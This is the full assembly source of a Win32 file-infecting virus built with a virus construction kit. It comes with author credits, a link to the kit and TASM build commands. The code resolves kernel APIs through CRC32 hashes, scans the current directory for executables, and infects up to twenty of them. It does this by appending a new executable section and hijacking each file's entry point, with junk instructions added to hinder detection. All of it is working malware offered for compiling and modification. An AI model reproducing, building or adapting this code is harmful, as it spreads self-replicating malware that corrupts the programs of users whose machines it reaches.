              
;
;
; Win32.NGVCK74 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK74
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 41
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; mov eax, 59600
 mov eax, 59600d
 cmp eax, 59600d
 je Notagoodfile

Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, ebx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ecx, 33817
 mov ecx, 33817d
 cmp ecx, 33817d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ecx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], -1
 shl ecx, 30d                           ; Trash
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ebx
 and ebx, 0
 push ebx
 push edx
 push ebx
                                        ; mov ecx, 4
 mov ecx, ( 4d + 33d )
 sub ecx, 33d
 push ecx
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 dec eax
 add eax, 1
 jz CloseFile
                                        ; clear ecx
 and ecx, 0
 push edx
 push ecx
 push ecx
                                        ; mov eax, 2
 mov eax, 2d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 add eax, -1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov esi, ebp
 add esi, offset filemask

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg eax, edx

 push eax
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov eax, ebp
 add eax, offset WFD_szFileName

                                        ; mov ebx, 276
 mov ebx, 0
 add ebx, 276d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 inc eax
 dec ebx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edx, edi

 push edi
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov eax, NumberOfApis

                                        ; load API Names and Offsets
 mov edi, ebp
 add edi, offset APIOffsets

 lea ebx, [ebp+APINames]


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], 0
 add dword ptr [edi], ecx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec eax
 jnz GetApisLoop
 lea edx, [ebp+Outbreak]
 xchg ecx, edx

 push ecx
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 MapAddress  dd 0h
 PEheader    dd 0h
 KernelMZ    dd 0h
 FileHandle  dd 0h
 TempApisearch2 dd 0h
 sectionalign   dd 0h
 NewSize     dd 0h
 Misc1       dd 0h
 OldEIP      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg1   dd 0h
 OldBase     dd 400000h
 NewEIP      dd 0h
 db 'Win32.NGVCK74 created by SnakeByte',0
 FindHandle  dd 0h
 KernelPE    dd 0h
 MapHandle   dd 0h
 OTableVA    dd 0h
 NTableVA    dd 0h
 InfCounter  dd 0h
 ATableVA    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable


 APIOffsets:
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h

 AlignTemp   dd 0h
 APICRC32    dd 0h

 counter     dw 0h
 AlignReg2   dd 0h
 filemask    db '*.eXe',0

 APINames:
 dd 068624A9Dh           ; CloseHandle
 dd 0C200BE21h           ; FindClose
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 08C892DDFh           ; CreateFileA
 dd 0797B49ECh           ; MapViewOfFile
 dd 094524B42h           ; UnmapViewOfFile
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA

 NTableTemp  dd 0h
 TempAPI     dd 0h
 filealign   dd 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], eax

                                        ; mov ebx, -1
 mov ebx, ( -1d - 39d )
 add ebx, 39d
 and ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ebx


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ebx, dword ptr [esp]
                                        ; round to pages
 sub bx, bx
                                        ; add ebx, 1
 sub ebx, -1d
GetKernelLoop:
                                        ; clear edx
 sub edx, edx
 sub ebx, 1
 mov dx, word ptr [ebx+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp ebx, dword ptr [ebx+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ebx
                                        ; add ebx, 60
 dec ebx
 add ebx, 61d
 mov eax, [ebx]
 dec ebx
 sub ebx, 59d
 add eax, ebx
 mov [KernelPE+ebp], eax

 jmp GetApis

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 push 0
 pop esi
 add esi, [ecx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add esi, 4
 add esi, 4d
                                        ; get NTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
 rol eax, 2d                            ; Trash
                                        ; add esi, 4
 add esi, 4d
                                        ; get OTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 pop dword ptr [ebp+NTableTemp]
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [edx]
                                        ; mov edx, ecx
                                        ; clear edx
 mov edx, -15479d
 add edx, 15479d
 add edx, ecx
                                        ; mov edi, edx
                                        ; clear edi
 xor edi, edi
 add edi, edx
 mov dword ptr [ebp+TempApisearch2], edi
 push ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov eax, dword ptr [ebp+APICRC32]
 sub eax, dword ptr [ebx]
 add eax, -1
 inc eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; clear edx
 and edx, 0
 xor edx, dword ptr [ebp+NTableTemp]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 xchg ecx, edx
 movzx ecx, word ptr [edx]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, edi
 add esi, [edi+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov ecx, [esi]
                                        ; mov edx, 60
 mov edx, ( 60d xor 9d )
 xor edx, 9d
 sub esi, edx
 mov dword ptr [ebp+filealign], ecx
 add eax, 54493329d                     ; Trash
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 xor dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov ebx, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], ebx
 mov eax, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov eax, [edx+38h]
 mov dword ptr [ebp+sectionalign], eax
                                        ; Get last section
 mov ebx, [edx+74h]
 shl ebx, 3
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [edx+6h]
 mov eax, 28h
 pushad
 mov eax, ecx
 mul eax
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; mov ecx, -1
 mov ecx, ( -1d + 5d )
 sub ecx, 5d
 and ecx, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, ebx
 add edx, ecx
 mov eax, offset newsection
 add eax, ebp


 xchg eax, edx
 push eax
                                        ; Calculate the RVA of the new section
 mov edx, [eax-5*8+8d]
 add edx, [eax-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov edx,[eax-5*8+20d]
 add edx,[eax-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], eax
 Call Align
 push dword ptr [ebp+AlignReg1]
 mov ecx, 92893949d                     ; Trash
 pop ebx
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+filealign]
 mov eax, ebx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 add eax, VirusSize
 push eax
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; mov eax, 64
 mov eax, ( 64d xor 22d )
 xor eax, 22d
 pop ecx
 lea edi, [ebp+newsection]
 xchg edi, ebx

WriteNewSectionLoop:
 mov dl, byte ptr [ebx]
 mov byte ptr [ecx], dl
 sub eax, 1
                                        ; add ebx, 1
 add ebx, 1d
                                        ; add ecx, 1
 inc ecx
 or eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+PEheader]
 sub word ptr [ecx+06h], -1
 push dword ptr [ebp+nsRVA]
 pop edx
 push edx
 pop dword ptr [ebp+NewEIP]
                                        ; set new EIP
 mov dword ptr  [ecx+28h], edx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], 0h
 add dword ptr [ecx+4Ch], 'NGVC'
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+nsphysicaloffset]
 push ebx
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg esi, eax

 mov ecx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop edx
 stc
ret



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, edi
 push edi
 pop esi
                                        ; mov ecx, edi
 mov ecx, edi
LenCRC:
                                        ; add ecx, 1
 sub ecx, -1d
 cmp byte ptr [ecx], 0
 jne LenCRC
 sub ecx, esi
                                        ; mov edi, ecx
 mov edi, ecx
                                        ; add edi, 1
 sub edi, -1d
 cld
                                        ; clear ebx
 mov ebx, 29729d
 sub ebx, 29729d
 dec ebx
                                        ; mov eax, ebx
 push ebx
 pop eax
NextByteCRC:
                                        ; clear ecx
 sub ecx, ecx
                                        ; clear edx
 push 0
 pop edx
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 xor cl, bl
 mov bl, bh
 mov bh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr dx, 1
 rcr cx, 1
jnc NoCRC
 xor cx,08320h
 xor dx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor ebx, ecx
 xor eax, edx
 dec edi
jnz NextByteCRC
 not eax
 not ebx
 mov ecx, eax
 rol ecx, 16d
 mov cx, bx
 mov dword ptr [ebp+APICRC32], ecx
 popad
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, 0
 mov ecx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edx

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 and ebx, 0
 push ebx
 call ExitProcess



end FakeCode

